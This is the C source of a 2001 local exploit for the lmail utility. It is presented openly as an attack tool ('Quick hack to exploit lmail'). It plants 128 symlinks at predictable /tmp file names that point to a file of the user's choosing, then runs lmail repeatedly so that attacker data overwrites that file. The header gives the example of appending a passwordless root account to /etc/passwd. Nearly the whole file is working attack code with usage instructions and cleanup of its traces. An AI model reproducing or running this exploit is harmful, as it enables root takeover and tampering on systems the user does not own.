/* lmail-xpl.c
 *
 * Quick hack to exploit lmail
 *
 * Simply run it with the file you want to create/overwrite
 * and the data you wish to place in the file.
 *
 * Example:
 *
 * $ gcc -g -Wall lmail-xpl.c -o lmail-xpl
 * $ ./lmail-xpl /etc/passwd owned::0:0::/root:/bin/bash
 *
 * Then login as owned... etc..
 *
 * by Charles Stevenson <core@ezlink.com>
 *
 * July 04 2001
 *
 * shoutz b10z
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define TEMPFILE "/tmp/ez.XXXXXX"
#define BRUTE 128

void usage(char*);

int main(int argc, char **argv){
   char tempfile[128] = TEMPFILE;
   int fd, i;
   pid_t pid;
   char temp[512];
   
   if (argc < 3){
      usage(argv[0]);
   }

   if((fd = mkstemp(tempfile))==-1){
      fprintf(stderr, "Error creating %s!\n",tempfile);
      exit(1);
   }

   /* begin lazy slacker coding */
   fprintf(stderr, "lmail-xpl.c by core (c) 2001\n");
   fprintf(stderr, "> backing up %s to %s\n", argv[1], tempfile);

   /* backup old file */
   sprintf(temp, "/bin/cp %s %s", argv[1], tempfile);
   system(temp);
   
   /* set the date/time */
   sprintf(temp, "/bin/touch -r %s %s", argv[1], tempfile);
   system(temp);

   pid = getpid();

   fprintf(stderr, "> creating a lot of symlinks\n");

   for (i=0;i<BRUTE;i++){
      sprintf(temp, "/tmp/lmail%d", pid+i);
      symlink(argv[1], temp);
   }

   sprintf(temp, "/bin/echo `perl -e 'print \"\\n\"'`%s | lmail -f\n", argv[2]);
   fprintf(stderr, "Running a few times since I'm lazy.\n");
   for (i=0;i<BRUTE;i++){
      system(temp);
      //sleep(1);
   }

   sprintf(temp, "/bin/ls -l %s", argv[1]);
   system(temp);

   fprintf(stderr, "> cleaning up\n");
   sprintf(temp, "/bin/rm -f /tmp/lmail*; /bin/rm -f /tmp/ez.*");
   system(temp);
   
   fprintf(stderr, "All done. Enjoy!\n");
   return 0;
}

void usage(char *name){
   
   fprintf(stderr, "usage: %s <filename> <data>\n", name);
   exit(1);
}
